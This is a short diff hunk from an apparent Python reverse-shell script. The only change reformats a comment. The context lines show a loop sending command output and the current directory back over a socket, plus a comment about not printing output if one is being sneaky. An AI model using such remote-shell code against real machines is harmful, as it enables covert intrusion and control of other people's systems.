@@ -28,5 +28,5 @@ while True:
     s.send(str.encode(output_str + str(os.getcwd())  + ">"))#get current directory
     #print(output_str)#if ur hidoi hito dont print
 
-#   close connection
+#close connection
 s.close()
